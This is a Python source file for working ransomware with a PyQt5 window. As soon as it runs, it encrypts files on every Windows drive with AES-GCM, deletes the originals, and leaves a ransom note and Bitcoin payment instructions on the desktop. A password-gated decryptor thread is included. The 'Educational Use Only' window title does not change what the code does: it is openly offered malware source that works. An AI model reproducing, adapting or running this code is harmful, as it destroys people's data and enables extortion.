import os
import sys
from PyQt5.QtWidgets import QMainWindow, QVBoxLayout, QLabel, QLineEdit, QPushButton, QWidget, QMessageBox, QProgressBar
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes

class Ransomware(QMainWindow):
    def __init__(self, password, ransom_message, extensions, email):
        super().__init__()
        self.password = password
        self.extensions = extensions
        self.ransom_message = ransom_message
        self.email = email
        self.initUI()
        self.encrypt_all_drives()
        
    def initUI(self):
        self.setWindowTitle('Ransomware - Educational Use Only')
        self.setGeometry(100, 100, 400, 200)
        
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        layout = QVBoxLayout()
        
        ransom_note = QLabel(self.ransom_message, self)
        ransom_note.setAlignment(Qt.AlignCenter)
        layout.addWidget(ransom_note)
        
        layout.addWidget(QLabel('Enter Decryption Password:'))
        self.decryption_password = QLineEdit(self)
        self.decryption_password.setEchoMode(QLineEdit.Password)
        layout.addWidget(self.decryption_password)
        
        decrypt_button = QPushButton('Decrypt Files', self)
        decrypt_button.clicked.connect(self.decrypt_files)
        layout.addWidget(decrypt_button)
        
        self.progress_bar = QProgressBar(self)
        layout.addWidget(self.progress_bar)
        
        central_widget.setLayout(layout)
        
    def encrypt_all_drives(self):
        drives = [chr(x) + ":/" for x in range(65, 91) if os.path.exists(chr(x) + ":/")]
        for drive in drives:
            self.encrypt_drive(drive)
        self.create_instructions()
    
    def encrypt_drive(self, drive):
        salt = get_random_bytes(16)
        key = PBKDF2(self.password, salt, dkLen=32, count=100000)
        for root, dirs, files in os.walk(drive):
            for file in files:
                file_path = os.path.join(root, file)
                if self.should_encrypt(file_path) and not self.is_excluded(file_path):
                    try:
                        self.encrypt_file(file_path, key, salt)
                    except (PermissionError, FileNotFoundError, OSError):
                        continue

    def should_encrypt(self, file_path):
        if self.extensions is None:
            return True
        return any(file_path.endswith(ext) for ext in self.extensions)
    
    def is_excluded(self, file_path):
        excluded_files = ['INSTRUCTIONS.txt', 'RANSOM_NOTE.txt', os.path.basename(sys.argv[0])]
        excluded_dirs = ['Windows', 'Program Files', 'Program Files (x86)']
        if any(excluded in file_path for excluded in excluded_files):
            return True
        if any(os.path.join(os.path.expanduser('~'), excluded_dir) in file_path for excluded_dir in excluded_dirs):
            return True
        return False
    
    def encrypt_file(self, file_path, key, salt):
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            cipher = AES.new(key, AES.MODE_GCM)
            ciphertext, tag = cipher.encrypt_and_digest(data)
            
            enc_file_path = file_path + '.enc'
            with open(enc_file_path, 'wb') as f:
                f.write(salt + cipher.nonce + tag + ciphertext)
            
            os.remove(file_path)
        except (PermissionError, FileNotFoundError, OSError):
            pass

    def decrypt_files(self):
        decryption_password = self.decryption_password.text()
        
        if decryption_password != self.password:
            QMessageBox.warning(self, 'Password Error', 'Incorrect decryption password.')
            return

        QMessageBox.information(self, 'Decryption Started', 'The decryption process has started.')
        
        self.progress_bar.setValue(0)
        self.progress_bar.setMaximum(100)
        
        self.decryptor = RansomwareDecryptor(decryption_password, self.progress_bar)
        self.decryptor.progress.connect(self.update_progress)
        self.decryptor.finished.connect(self.on_decryption_complete)
        self.decryptor.start()
    
    def update_progress(self, value):
        self.progress_bar.setValue(value)
    
    def on_decryption_complete(self):
        QMessageBox.information(self, 'Success', 'Files decrypted successfully.')
        self.progress_bar.setValue(100)
    
    def create_instructions(self):
        desktop_path = os.path.join(os.path.join(os.path.expanduser('~')), 'Desktop')
        instructions_path = os.path.join(desktop_path, 'INSTRUCTIONS.txt')
        ransom_note_path = os.path.join(desktop_path, 'RANSOM_NOTE.txt')
        
        instructions = f"""
        How to pay with Bitcoin:
        
        1. Go to a Bitcoin exchange platform (e.g., Coinbase, Binance).
        2. Create an account and purchase the necessary amount of Bitcoin.
        3. Send the Bitcoin to the address specified in the RANSOM_NOTE.txt file.
        4. After the payment, email the transaction ID to {self.email}.
        
        Note: Ensure that you follow the instructions carefully to recover your files.
        """
        
        with open(instructions_path, 'w', encoding='utf-8') as f:
            f.write(instructions)

        with open(ransom_note_path, 'w', encoding='utf-8') as f:
            f.write(self.ransom_message)

class RansomwareDecryptor(QThread):
    finished = pyqtSignal()
    progress = pyqtSignal(int)
    
    def __init__(self, password, progress_bar):
        super().__init__()
        self.password = password
        self.progress_bar = progress_bar
    
    def run(self):
        drives = [chr(x) + ":/" for x in range(65, 91) if os.path.exists(chr(x) + ":/")]
        total_files = sum(len(files) for drive in drives for root, dirs, files in os.walk(drive))
        processed_files = 0
        
        for drive in drives:
            for root, dirs, files in os.walk(drive):
                for file in files:
                    if file.endswith('.enc'):
                        file_path = os.path.join(root, file)
                        self.decrypt_file(file_path, self.password)
                        processed_files += 1
                        progress = int((processed_files / total_files) * 100)
                        self.progress.emit(progress)
        
        self.finished.emit()
    
    def decrypt_drive(self, drive):
        for root, dirs, files in os.walk(drive):
            for file in files:
                if file.endswith('.enc'):
                    file_path = os.path.join(root, file)
                    self.decrypt_file(file_path, self.password)
    
    def decrypt_file(self, file_path, password):
        try:
            with open(file_path, 'rb') as f:
                salt = f.read(16)
                nonce = f.read(16)
                tag = f.read(16)
                ciphertext = f.read()
            
            key = PBKDF2(password, salt, dkLen=32, count=100000)
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            
            try:
                data = cipher.decrypt_and_verify(ciphertext, tag)
            except ValueError:
                return
            
            original_file_path = file_path[:-4]  # Remove .enc extension
            with open(original_file_path, 'wb') as f:
                f.write(data)
            
            os.remove(file_path)
        except (PermissionError, FileNotFoundError, OSError):
            pass
